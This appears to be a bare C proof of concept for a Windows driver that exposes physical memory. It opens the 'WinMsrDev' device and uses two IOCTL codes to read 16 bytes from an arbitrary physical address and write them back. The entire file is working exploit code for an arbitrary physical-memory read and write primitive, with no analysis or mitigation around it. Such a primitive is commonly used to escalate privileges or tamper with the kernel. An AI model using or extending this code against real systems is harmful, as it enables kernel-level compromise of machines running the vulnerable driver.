#include <windows.h>
#include <stdio.h>
#include <stdint.h>

#define DEVICE_NAME L"\\\\.\\WinMsrDev"
#define IOCTL_READ_PHYSICAL_MEMORY  0x9C406104
#define IOCTL_WRITE_PHYSICAL_MEMORY 0x9C40A108

typedef struct _PHYSICAL_MEMORY_INFO {
    uint64_t Address;
    uint32_t Size;
    uint32_t UnitSize;
} PHYSICAL_MEMORY_INFO, *PPHYSICAL_MEMORY_INFO;

int main() {
    HANDLE hDevice = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Opened device handle: 0x%p\n", hDevice);

    uint64_t targetAddress = 0x1000; // Example physical address
    uint32_t transferSize = 16;
    uint8_t buffer[16] = { 0 };
    DWORD bytesReturned = 0;

    // 1. Read Physical Memory
    PHYSICAL_MEMORY_INFO readInput = { targetAddress, transferSize, 1 };
    if (DeviceIoControl(hDevice, IOCTL_READ_PHYSICAL_MEMORY, &readInput, sizeof(readInput), buffer, transferSize, &bytesReturned, NULL)) {
        printf("[+] Successfully read %lu bytes from physical address 0x%llX:\n", transferSize, targetAddress);
        for (DWORD i = 0; i < transferSize; i++) {
            printf("%02X ", buffer[i]);
        }
        printf("\n");
    } else {
        printf("[-] Read failed. Error: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }

    // 2. Write Physical Memory (Echoing the read bytes back)
    DWORD totalWriteSize = sizeof(PHYSICAL_MEMORY_INFO) + transferSize;
    PPHYSICAL_MEMORY_INFO writeInput = (PPHYSICAL_MEMORY_INFO)malloc(totalWriteSize);
    if (!writeInput) {
        CloseHandle(hDevice);
        return 1;
    }

    writeInput->Address = targetAddress;
    writeInput->Size = transferSize;
    writeInput->UnitSize = 1;
    memcpy((BYTE*)writeInput + sizeof(PHYSICAL_MEMORY_INFO), buffer, transferSize);

    if (DeviceIoControl(hDevice, IOCTL_WRITE_PHYSICAL_MEMORY, writeInput, totalWriteSize, NULL, 0, &bytesReturned, NULL)) {
        printf("[+] Successfully wrote %lu bytes back to physical address 0x%llX\n", transferSize, targetAddress);
    } else {
        printf("[-] Write failed. Error: %lu\n", GetLastError());
    }

    free(writeInput);
    CloseHandle(hDevice);
    return 0;
}